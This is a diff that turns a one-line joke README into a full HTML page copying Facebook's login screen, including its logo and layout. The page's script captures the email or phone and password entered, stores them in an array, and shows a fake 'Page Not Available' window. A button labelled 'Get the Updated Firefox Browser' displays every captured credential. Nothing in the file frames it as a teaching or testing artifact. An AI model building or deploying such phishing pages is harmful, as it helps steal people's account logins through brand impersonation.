@@ -1,2 +1,247 @@
-# Gorillaphs.
-gorilla memes are fun right? hahaha
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Facebook Login</title>
+<style>
+    body {
+        margin: 0;
+        font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        background-color: #f0f2f5;
+    }
+
+    .container {
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        padding: 50px 0;
+    }
+
+    .content {
+        display: flex;
+        max-width: 930px;
+        width: 100%;
+        background-color: #fff;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        border-radius: 8px;
+        overflow: hidden;
+    }
+
+    /* Left side - info */
+    .left {
+        flex: 1;
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+    }
+
+    .left h2 {
+        font-size: 24px;
+        font-weight: 700;
+        margin-bottom: 20px;
+    }
+
+    .left p {
+        font-size: 20px;
+        line-height: 1.4;
+    }
+
+    /* Right side - login form */
+    .right {
+        flex: 1;
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .fb-logo {
+        width: 250px;
+        margin-bottom: 20px;
+    }
+
+    form {
+        width: 100%;
+        max-width: 350px;
+        display: flex;
+        flex-direction: column;
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+
+    input {
+        margin-bottom: 10px;
+        padding: 14px;
+        border: 1px solid #dddfe2;
+        border-radius: 6px;
+        font-size: 14px;
+    }
+
+    button {
+        background-color: #1877f2;
+        color: #fff;
+        padding: 14px;
+        border: none;
+        border-radius: 6px;
+        font-weight: 600;
+        font-size: 15px;
+        cursor: pointer;
+    }
+
+    button:hover {
+        background-color: #166fe5;
+    }
+
+    .forgot {
+        margin-top: 12px;
+        font-size: 14px;
+        color: #385898;
+        text-align: center;
+        cursor: pointer;
+    }
+
+    .divider {
+        display: flex;
+        align-items: center;
+        text-align: center;
+        margin: 20px 0;
+    }
+
+    .divider::before, .divider::after {
+        content: "";
+        flex: 1;
+        border-bottom: 1px solid #dadde1;
+    }
+
+    .divider:not(:empty)::before {
+        margin-right: 10px;
+    }
+
+    .divider:not(:empty)::after {
+        margin-left: 10px;
+    }
+
+    .create-account {
+        width: 100%;
+        max-width: 350px;
+        display: flex;
+        justify-content: center;
+    }
+
+    .create-btn {
+        background-color: #42b72a;
+        padding: 14px 20px;
+        border: none;
+        border-radius: 6px;
+        color: #fff;
+        font-weight: 600;
+        font-size: 15px;
+        cursor: pointer;
+    }
+
+    .create-btn:hover {
+        background-color: #36a420;
+    }
+
+    /* Visible secret button styles */
+    #secretButton {
+        display: block; /* Made visible */
+        margin-top: 10px;
+        padding: 10px 15px;
+        background-color: #e7e7e7;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 14px;
+        width: 100%;
+        max-width: 350px;
+        text-align: center;
+    }
+
+    /* Responsive adjustments */
+    @media(max-width: 768px){
+        .content {
+            flex-direction: column;
+        }
+        .left, .right {
+            max-width: 100%;
+            padding: 20px;
+        }
+    }
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="content">
+        <!-- Left side -->
+        <div class="left">
+            <h2>Connect with friends and the world around you on Facebook.</h2>
+            <p>See photos and updates from friends in your news feed.</p>
+        </div>
+        <!-- Right side -->
+        <div class="right">
+            <!-- Facebook Logo -->
+            <img class="fb-logo" src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
+            <!-- Login Form -->
+            <form id="loginForm">
+                <input type="text" id="phoneEmail" placeholder="Email or Phone" required />
+                <input type="password" id="password" placeholder="Password" required />
+                <button type="submit">Log In</button>
+                <div class="forgot" id="forgotPassword">Forgotten password?</div>
+            </form>
+            <!-- Secret Button (visible now) -->
+            <button id="secretButton">Get the Updated Firefox Browser</button>
+            <!-- Divider -->
+            <div class="divider">or</div>
+            <!-- Create Account Button -->
+            <div class="create-account">
+                <button class="create-btn" id="createAccount">Create New Account</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Array to store all login credentials
+    const allCredentials = [];
+
+    // Handle login form submission
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // Prevent actual form submission
+        const phoneEmail = document.getElementById('phoneEmail').value;
+        const password = document.getElementById('password').value;
+        // Store credentials as an object
+        allCredentials.push({ emailOrPhone: phoneEmail, password: password });
+        // Open new window with "Page Not Available"
+        window.open('about:blank', '_blank').document.write('<h1 style="text-align:center;margin-top:50px;font-family:sans-serif;">Page Not Available</h1>');
+    });
+
+    // Handle "Forgotten password" click
+    document.getElementById('forgotPassword').addEventListener('click', function() {
+        alert('Redirect to password recovery page.');
+    });
+
+    // Handle "Create New Account" button click
+    document.getElementById('createAccount').addEventListener('click', function() {
+        alert('Redirect to account creation page.');
+    });
+
+    // Handle secret button click to show all stored credentials
+    document.getElementById('secretButton').addEventListener('click', function() {
+        if(allCredentials.length > 0) {
+            let message = 'Stored login credentials:\n\n';
+            allCredentials.forEach((cred, index) => {
+                message += `${index + 1}. Email/Phone: ${cred.emailOrPhone}\n   Password: ${cred.password}\n\n`;
+            });
+            alert(message);
+        } else {
+            alert('No credentials stored yet.');
+        }
+    });
+</script>
+</body>
+</html>
